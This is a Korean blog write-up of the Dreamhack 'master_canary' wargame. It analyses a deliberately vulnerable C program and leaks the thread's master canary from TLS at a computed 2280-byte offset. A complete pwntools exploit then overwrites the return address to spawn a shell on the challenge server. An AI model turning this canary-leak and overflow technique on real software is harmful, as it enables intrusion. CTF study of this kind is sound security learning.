---
title: Dreamhack wargame master_canary write-up
tags: [Dreamhack, pwnable, master_canary]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

## Code Analysis
---
``` c
// gcc -o master master.c -pthread
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;

}
void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}
int main(int argc, char *argv[]) {
    size_t size;
    pthread_t thread_t;
    size_t idx;
    char leave_comment[32];


    initialize();

    while(1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0)
                {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%d", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }
    

    return 0;
}
```
<br><br>

## Vulnerability Analysis
---
master canary 값은 **TLS**(Thread Local Storage) 영역에 저장된다고 한다.<br>
Thread 함수인 thread_routine 함수의 스택은 **TLS** 영역과 인접하게 할당된다.<br><br>

thread_routine 함수는 전역 변수인 global_buffer에 지역 변수인 buf의 주소값을 넘겨준 후 종료된다.<br>
read_bytes 함수를 통해 buf 변수에 입력하는 과정에서 master canary 앞까지 모두 채운다면, case 2번의 global_buffer의 값을 출력하는 과정에서 master canary까지 출력시킬 수 있다.<br><br>

case 3번은 buffer overflow 취약점이 발생하는데, 이 때 master canary와 비교하는 버퍼의 값을 이전에 구한 master canary로 채워준 후 ret 값을 get_shell의 주소로 변조하면 쉘을 획득할 수 있다.<br><br>

### 공격 순서
1. 1번 메뉴를 통해 스레드 함수를 실행시킨다.
2. buf 변수와 master canary간의 offset을 구한다.
3. 2번 메뉴를 통해 offset만큼의 값을 채운다.
4. 3번 메뉴에서 leak된 master canary를 사용하여 canary 비교 루틴을 우회할 수 있고 결과적으로 ret를 변조할 수 있게 된다.

<br>

먼저 master canary의 주소를 찾아보자.<br>
``` sh
gef➤  disas thread_routine
Dump of assembler code for function thread_routine:
   0x0000000000400a5b <+0>:	push   rbp
   0x0000000000400a5c <+1>:	mov    rbp,rsp
   0x0000000000400a5f <+4>:	sub    rsp,0x110
   0x0000000000400a66 <+11>:	mov    rax,QWORD PTR fs:0x28
=> 0x0000000000400a6f <+20>:	mov    QWORD PTR [rbp-0x8],rax
```
thread_routine에서 rax에 담겨진 것이 master canary 이다.<br><br>
``` sh
$rax   : 0xc118d900b1f1cd00
.
.
.
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a5c <thread_routine+1> mov    rbp, rsp
     0x400a5f <thread_routine+4> sub    rsp, 0x110
     0x400a66 <thread_routine+11> mov    rax, QWORD PTR fs:0x28
 →   0x400a6f <thread_routine+20> mov    QWORD PTR [rbp-0x8], rax
.
.
.
```
master canary의 값은 0xc118d900b1f1cd00 임을 확인하였다.<br>
0xc118d900b1f1cd00의 주소를 알아보자.<br><br>
``` sh
gef➤  grep 0xc118d900b1f1cd00
[+] Searching '\x00\xcd\xf1\xb1\x00\xd9\x18\xc1' in memory
[+] In (0x7f29a8a61000-0x7f29a9261000), permission=rw-
  0x7f29a9260728 - 0x7f29a9260748  →   "\x00\xcd\xf1\xb1\x00\xd9\x18\xc1[...]"
[+] In (0x7f29a9a61000-0x7f29a9a65000), permission=rw-
  0x7f29a9a62728 - 0x7f29a9a62748  →   "\x00\xcd\xf1\xb1\x00\xd9\x18\xc1[...]"
[+] In '[stack]'(0x7ffe76086000-0x7ffe760a7000), permission=rw-
  0x7ffe760a5968 - 0x7ffe760a5988  →   "\x00\xcd\xf1\xb1\x00\xd9\x18\xc1[...]"
```
0x7f29a9260728, 0x7f29a9a62728, 0x7ffe760a5968 이렇게 3개가 존재한다.<br>
read_bytes함수에서 buf 변수가 존재하는 스택의 범위를 살펴보자.<br><br>
``` sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400b05 <+0>:	push   rbp
   0x0000000000400b06 <+1>:	mov    rbp,rsp
   .
   .
   .
   0x0000000000400abc <+34>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x0000000000400ac0 <+38>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400ac4 <+42>:	add    rax,rdx
   0x0000000000400ac7 <+45>:	mov    edx,0x1
   0x0000000000400acc <+50>:	mov    rsi,rax
   0x0000000000400acf <+53>:	mov    edi,0x0
=> 0x0000000000400ad4 <+58>:	call   0x400860 <read@plt>
   .
   .
   .
```
``` sh
$rsi   : 0x00007f29a925fe40  →  0x0000000000000000
```
``` sh
gef➤  vmmap 0x00007f29a925fe40
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007f29a8a61000 0x00007f29a9261000 0x0000000000000000 rw-
```
0x00007f29a8a61000 ~ 0x00007f29a9261000 사이임을 알았다.<br>
이 범위안에 해당되는 master canary의 주소는 0x7f29a9260728 이다.<br><br>

이제 오프셋을 구해보자.<br>
``` sh
gef➤  p/d 0x7f29a9260728 - 0x00007f29a925fe40
$8 = 2280
```
buf와 master canary의 offset은 2280임을 구하였다.<br><br>

> master canary를 변조하는 방법도 있는데, 이 방법을 쓰지 못하는 이유가 있다.<br> 우리가 덮을 수 있는 master canary는 thread에 있는 master canary 이다.<br>따라서 main thread에서의 master canary는 변조되지 않는다.

<br>

## Exploit
---
``` python
#mater_canary.py
from pwn import *
# context.log_level = 'debug'

p = remote('host1.dreamhack.games', 15626)
e = ELF('./master_canary')

# p = process('./master_canary')
# e = ELF('./master_canary')
# libc = e.libc

p.recvuntil('> ')

p.sendline('1')

p.sendline('2')

time.sleep(1)

p.sendlineafter('Size: ', '2281')

p.recvuntil('Data: ')

for i in range(2281):
    p.send('A')

time.sleep(1)

p.recvuntil('Data: ')
p.recv(2281)

canary = u64(p.recv(7).rjust(8, '\x00'))
print 'Master Canary: ' + hex(canary)

p.sendline('3')

time.sleep(1)

payload = 'A' * 40
payload += p64(canary)
payload += 'A' * 8
payload += p64(e.sym['get_shell'])

p.sendafter(': ',payload)

p.interactive()
```

<br>

``` sh
lourcode@lourcode:~/Share/lourcode/Pwnable/dreamhack/master_canary$ python mater_canary.py
[+] Opening connection to host1.dreamhack.games on port 15626: Done
[*] '/home/lourcode/Share/lourcode/Pwnable/dreamhack/master_canary/master_canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Master Canary: 0xbd248a1e37945400
[*] Switching to interactive mode
$ id
uid=1000(master_canary) gid=1000(master_canary) groups=1000(master_canary)
```
쉘을 획득했다.
<br><br>

### Good Game!
EZ<br><br>

*처음에 18.04로 exploit을 시도했다가 실패했다.<br>오프셋을 맞게 구했는데도 로컬에서조차 쉘을 따지 못하였다.<br>버전을 꼭 맞춰야할 거 같다.*
<br><br>

너무 힘들었다..<br>
![img1](/assets/master_canary/img1.png)
